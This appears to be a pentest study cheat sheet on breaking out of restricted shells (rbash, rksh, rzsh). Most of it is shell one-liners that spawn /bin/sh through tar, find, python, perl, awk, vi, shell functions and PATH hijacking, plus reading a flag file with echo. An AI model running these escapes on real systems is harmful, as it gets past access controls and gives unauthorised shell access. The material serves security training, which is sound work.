# Restricted Shells & Escape Techniques

> A restricted shell limits the commands available to a user, reducing their ability to navigate the system, modify environment variables, or execute arbitrary code. Understanding how these restrictions work — and how they can be bypassed — is fundamental in privilege escalation and lateral movement during a pentest.

---

## Common Restricted Shells

| Shell   | Type                | Key Restrictions                                               |
| ------- | ------------------- | -------------------------------------------------------------- |
| `rbash` | Restricted Bash     | No `cd`, no `$PATH` modification, no scripts via path         |
| `rksh`  | Restricted Korn Shell | No function creation, restricted command access              |
| `rzsh`  | Restricted Zsh      | No aliases, limited scripting, no path modifications          |

---

## Escape Techniques

### 1. Command Substitution
Inject a command inside another using backtick or dollar-paren syntax.
```shell
ls -l `pwd`
ls -l $(whoami)
```

### 2. Command Injection
Abuse arguments that pass user input directly to execution.
```shell
# Via tar checkpoint action
tar -cf archive.tar --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Via find -exec
find . -exec /bin/sh \;
```

### 3. Command Chaining
Chain multiple commands in a single line to bypass parsing restrictions.
```shell
ls; whoami
whoami && id
cat file.txt | less
```

### 4. Environment Variable Hijacking
If the shell uses `$PATH`, place a fake binary (`ls`, `cat`, `sh`) in `/tmp` to redirect execution.
```shell
PATH=/tmp:$PATH
export PATH
```

### 5. Shell Functions
Define a custom function that spawns an unrestricted shell.
```shell
mysh() { /bin/sh; }
mysh
```

### 6. Breakout Binaries
Use available scripting interpreters to escape the restricted environment.
```shell
python3 -c 'import os; os.system("/bin/sh")'
perl -e 'exec "/bin/sh";'
awk 'BEGIN {system("/bin/sh")}'
```

### 7. Escape via Text Editors
If `vi` or `vim` is accessible, spawn a shell from within the editor.
```shell
vi
:set shell=/bin/bash
:shell
```

### 8. Read Files via Echo
Exfiltrate file contents without relying on `cat`.
```shell
echo "$(<flag.txt)"
```
